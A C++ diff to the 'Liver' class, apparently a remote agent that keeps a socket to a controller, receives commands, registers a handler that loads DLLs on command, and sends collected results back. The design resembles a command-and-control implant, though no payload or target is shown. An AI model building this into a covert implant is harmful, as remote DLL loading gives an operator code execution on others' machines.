@@ -1,6 +1,5 @@
 ﻿#include "Include/Liver.hpp"
 
-#include "CommandHandlerFactory.hpp"
 #include "ICommandHandler.hpp"
 #include "Json.hpp"
 #include "LiverConfiguration.hpp"
@@ -10,6 +9,7 @@
 #include "Communicators/RawCommunicator.hpp"
 #include "Communicators/Protocol/KeepAliveRequest.hpp"
 #include "Communicators/Protocol/SendRandomResponse.hpp"
+#include "Handlers/LoadDllHandler.hpp"
 #include "Networking/MaintainedSocket.hpp"
 #include "Synchronization/Event.hpp"
 #include "Utils/Random.hpp"
@@ -24,8 +24,10 @@ Liver::Liver(Event::Ptr quit_event,
 	m_communicator(std::move(communicator)),
 	m_iteration_delay(iteration_delay),
 	m_products(),
-	libraries()
+	m_libraries(std::make_shared<LibrariesContainer>()),
+	m_handlers()
 {
+	register_handlers();
 }
 
 void Liver::run()
@@ -76,8 +78,7 @@ IRequest::Ptr Liver::get_next_request()
 	{
 		return std::make_unique<KeepAliveRequest>(m_liver_id);
 	}
-	// todo:
-	return nullptr;
+	return std::make_unique<ReturnProductsResponse>(m_liver_id, m_products.pop_all());
 }
 
 void Liver::handle_response(IResponse::Ptr response)
@@ -126,10 +127,23 @@ void Liver::execute_commands(const std::vector<ICommand::Ptr>& commands)
 {
 	for (const ICommand::Ptr& command : commands)
 	{
-		std::vector<IProduct::Ptr> products = ICommandHandler::run_handler(
-			*this,
-			CommandHandlerFactory::create(command)
-		);
+		if (!m_handlers.contains(command->type()))
+		{
+			TRACE(L"unhandled command type: ", static_cast<uint32_t>(command->type()));
+			continue;
+		}
+		const ICommandHandler::Ptr& handler = m_handlers[command->type()];
+		std::vector<IProduct::Ptr> products = handler->handle(command);
 		m_products.insert_all(std::move(products));
 	}
+}
+
+void Liver::register_handlers()
+{
+	register_handler(ICommand::Type::LOAD_DLL, std::make_unique<LoadDllHandler>(m_libraries));
+}
+
+void Liver::register_handler(const ICommand::Type type, ICommandHandler::Ptr handler)
+{
+	m_handlers.insert_or_assign(type, std::move(handler));
 }
